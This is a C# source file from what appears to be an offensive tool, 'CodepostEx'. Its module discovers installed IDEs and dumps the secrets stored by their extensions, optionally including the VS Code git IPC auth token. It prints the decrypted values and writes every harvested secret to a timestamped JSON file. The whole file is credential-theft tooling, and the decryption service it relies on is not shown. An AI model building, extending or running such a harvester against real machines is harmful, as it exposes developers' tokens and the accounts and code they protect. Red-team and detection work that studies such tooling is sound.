using System.Text.Json;
using CodepostEx.Core;
using CodepostEx.Models;
using CodepostEx.Services;
using Microsoft.Extensions.DependencyInjection;

namespace CodepostEx.Modules;

public sealed class SecretsModule
{
    public static void Run(string ide, bool includeGit, string output, IServiceProvider sp)
    {
        var discovery = sp.GetRequiredService<IdeDiscoveryService>();
        var extractor = sp.GetRequiredService<SecretExtractor>();
        var paths     = sp.GetRequiredService<PathResolver>();

        var targets = discovery.ResolveAll(IdeProfiles.Filter(ide).ToList(), paths).ToList();

        if (targets.Count == 0)
        {
            Out.Minus($"No IDE detected for --ide {ide}");
            return;
        }

        if (!includeGit)
            Out.Star("Skipping vscode.git git-ipc-auth-token (use --include-git-secrets to show)");

        var allSecrets = new List<SecretEntry>();

        foreach (var target in targets)
        {
            Out.Star($"Dumping extension secrets for {target.Name}...");
            var secrets = extractor.Extract(target, includeGit);

            if (secrets.Count == 0)
            {
                Out.Minus($"No extension secrets found for {target.Name}");
                continue;
            }

            var decryptedCount = secrets.Count(s => s.Decrypted);
            Out.Plus($"Found {secrets.Count} secret(s) ({decryptedCount} decrypted) in {target.Name}");

            foreach (var s in secrets)
            {
                Out.Plus($"{s.ExtensionId}");
                Out.Item($"SecretKey: {s.SecretKey}");
                Out.Item($"Database: {s.Database}");
                Out.Item($"Decrypted: {s.Decrypted}");
                if (s.Decrypted && s.Value is not null)
                {
                    var preview = s.Value.Length > 160 ? s.Value[..160] + "..." : s.Value;
                    Out.Item($"Value: {preview}");
                }
                Out.Blank();
                allSecrets.Add(s);
            }
        }

        if (allSecrets.Count == 0) return;

        Out.Plus($"Total secrets: {allSecrets.Count}");

        try
        {
            Directory.CreateDirectory(output);
            var stamp   = DateTime.Now.ToString("yyyyMMdd_HHmmss");
            var outFile = Path.Combine(output, $"secrets_{stamp}.json");
            var json    = JsonSerializer.Serialize(allSecrets, new JsonSerializerOptions { WriteIndented = true });
            File.WriteAllText(outFile, json, System.Text.Encoding.UTF8);
            Out.Plus($"Saved: {outFile}");
        }
        catch (Exception ex)
        {
            Out.Minus($"Failed to write output: {ex.Message}");
        }
    }
}
